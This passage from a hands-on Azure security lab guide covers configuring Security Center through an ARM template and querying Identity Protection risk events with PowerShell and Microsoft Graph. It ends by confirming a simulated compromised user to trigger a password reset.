New-AzureRmDeployment -TemplateFile 'https://raw.githubusercontent.com/tianderturpijn/Azure-Security-Center/master/Labs/09%20-%20Automation%20with%20ARM/Files/configureAscAdvanced.json' `
-name 'AscAdvancedDeployment' -Location 'eastus' -autoProvisioning 'On' -workspaceName '<yourWorkspaceName>' `
-workspaceSubscriptionId '<yourAzuresubscriptionID>' -workspaceResourceGroup '<resourceGroupNameOfTheWorkspace>' `
-emailSecurityContact 'john@contoso.com' -phoneSecurityContact '12345' -alertNotifications 'On' -alertsToAdmin 'On' `
-securitySettings 'On'
```
*Note: it might take a couple minutes for the Azure portal to catch up and show your updated settings (like autoProvision)*

# Pull data from APIs
[:arrow_left: Home](#azure-active-directory)

## Get Started with the API

There are four steps to accessing Identity Protection data through Microsoft Graph:


1. []	Create a new app registration. 
3. []	Use this secret and a few other pieces of information to authenticate to Microsoft Graph, where you receive an authentication token. 
4. []	Use this token to make requests to the API endpoint and get Identity Protection data back.

## Create a new app registration

1. []	On the Active Directory page, in the Manage section, click App registrations.

	!IMAGE[h5fd84va.jpg](\Media\h5fd84va.jpg)
2. []	In the menu on the top, click New application registration.

	!IMAGE[vptami21.jpg](\Media\vptami21.jpg)
3. []	On the Create page, perform the following steps:

	!IMAGE[uh5cjkmi.jpg](\Media\uh5cjkmi.jpg)
	1. [] In the Name textBox, type a name for your application (e.g.: AADIP Risk Event API Application).
	1. [] As Type, select Web Application And / Or Web API.
	1. [] In the Sign-on URL textBox, type ```http://localhost```.
	1. [] Click Create.
4. []	To open the Settings page, in the applications list, click your newly created app registration. 
5. []	Copy the Application ID and paste it into a new text document. This will be needed later in the lab.

===
## Grant your application permission to use the API
[:arrow_left: Home](#azure-active-directory)

1. []	On the Settings page, click Required permissions.

	!IMAGE[87aolleh.jpg](\Media\87aolleh.jpg)

## Get an access key
[:arrow_left: Home](#azure-active-directory)

1. []	On the Settings page, click Keys.

	!IMAGE[to0mwhls.jpg](\Media\to0mwhls.jpg)
2. []	On the Keys page, perform the following steps:

	!IMAGE[3xrwo38o.jpg](\Media\3xrwo38o.jpg)
	1. [] In the Key description textBox, type a description (for example, AADIP Risk Event).
	1. [] As Duration, select In 1 year.
	1. [] Click Save.
	1. [] Copy the key value, and then paste it into a safe location. 

	Since we will use this value later on, copy the Client Secret into the text file where you stored the client id.

	> [!Note] If you lose this key, you will have to return to this section and create a new key. Keep this key a secret: anyone who has it can access your data.
===
## Authenticate to Microsoft Graph and query the Identity Risk Events API
[:arrow_left: Home](#azure-active-directory)

At this point, you should have specified the following values in your text file:

- The client ID 

- The key 

## Querying the API using PowerShell

Now that we have configured the app registration and retrieved the values needed to authenticate, we can query the IdentityRiskEvents API using PowerShell.

## See medium-risk and  high-risk events

First, let’s assess how many risk events we have that are medium or high risk. These are the events that have the capability to trigger the sign-in or user-risk policies. Since they have a medium or high likelihood of user compromise, remediating these events should be a priority. 

1. [] Open a **PowerShell ISE** window and, in the **script pane**, type the PowerShell code below.  

1. [] Insert the saved **Client ID** and **key** for the values of **ClientID** and **ClientSecret** variable and click **Run**.

	```
	##Get all your medium or high-risk risk events

	$ClientID       = "ClientID"        # Should be a ~36 hex character string; insert your info here
	$ClientSecret   = "ClientSecret"    # Should be a ~44 character string; insert your info here
	$tenantdomain   = "@lab.CloudCredential(134).TenantName"    # For example, contoso.onmicrosoft.com

	$loginURL       = "https://login.microsoft.com"
	$resource       = "https://graph.microsoft.com"
	$body      = @{grant_type="client_credentials";resource=$resource;client_id=$ClientID;client_secret=$ClientSecret}
	$oauth     = Invoke-RestMethod -Method Post -Uri $loginURL/$tenantdomain/oauth2/token?api-version=beta -Body $body
	Write-Output $oauth
	if ($oauth.access_token -ne $null) {
	$headerParams = @{'Authorization'="$($oauth.token_type) $($oauth.access_token)"}
	$url = "https://graph.microsoft.com/beta/identityRiskEvents $filter=riskLevel eq 'high' or riskLevel eq 'medium'" 
	Write-Output $url
	$myReport = (Invoke-WebRequest -UseBasicParsing -Headers $headerParams -Uri $url)
	foreach ($event in ($myReport.Content | ConvertFrom-Json).value) {
		Write-Output $event
	}
	} else {
	Write-Host "ERROR: No Access Token"
	} 
	```

## Investigate a specific user
When you believe a user may have been compromised, you can better understand the state of their risk by getting all of their risk events. Similarly, if you have users that you believe may be more likely targets of compromise, you can proactively retrieve their risky events.

Since we know that Adam had some risky-sign ins, let’s query their risk events.

1. [] In the **PowerShell ISE**, open a new file and, in the **script pane**, type the PowerShell code below.

1. [] Insert the saved **Client ID** and **key** for the values of **ClientID** and **ClientSecret** variable and click **Run**.

	```
	##Get a specific user's risk events

	$ClientID       = "ClientID"        # Should be a ~36 hex character string; insert your info here
	$ClientSecret   = "ClientSecret"    # Should be a ~44 character string; insert your info here
	$tenantdomain   = "@lab.CloudCredential(134).TenantName"    # For example, contoso.onmicrosoft.com

	$loginURL       = "https://login.microsoft.com"
	$resource       = "https://graph.microsoft.com"
	$body      = @{grant_type="client_credentials";resource=$resource;client_id=$ClientID;client_secret=$ClientSecret}
	$oauth     = Invoke-RestMethod -Method Post -Uri $loginURL/$tenantdomain/oauth2/token?api-version=beta -Body $body
	Write-Output $oauth
	if ($oauth.access_token -ne $null) {
	$headerParams = @{'Authorization'="$($oauth.token_type) $($oauth.access_token)"}
	$url = "https://graph.microsoft.com/beta/identityRiskEvents?`$filter=userID eq '<Adam’s user ID>'"
	Write-Output $url
	$myReport = (Invoke-WebRequest -UseBasicParsing -Headers $headerParams -Uri $url)
	foreach ($event in ($myReport.Content | ConvertFrom-Json).value) {
		Write-Output $event
	}
	} else {
	Write-Host "ERROR: No Access Token"
	} 
	```

# Simulate risky user experience
[:arrow_left: Home](#azure-active-directory)

Remember our risky sign-ins from earlier? Let’s take a look at them in the Azure portal

1. []	Navigate to ```https://portal.azure.com/?Microsoft_AAD_IAM_ipcv2=true&Microsoft_AAD_IAM_securityarea=true#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/Security```
2. []	Click on the **Security** blade and then select **Risky sign-ins**
3. []	You should see the Tor sign ins from Adam, Bob, and Evan. To dive deeper, click on a specific sign-in record
4. []	In the details drawer, you can toggle through the basic info, device info, risk info tabs to learn more about that particular sign-in

Now that we have taken a look at risky sign-ins, let’s find out what happens if Identity Protection detects a high-risk user. For the purposes of this lab, we will force a user to go to **high-risk**

1. []	Navigate to ```https://portal.azure.com/?Microsoft_AAD_IAM_ipcv2=true&Microsoft_AAD_IAM_securityarea=true#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/Security```
2. []	Click on the **Security** blade and then select **Risky sign-ins**
3. []	Click on the risky sign-in record for Bob and select **confirmed compromise**
4. []	Now, open a new InPrivate window and try to log-in to portal.office.com as Bob
	1. []	You will be prompted to reset Bob’s password
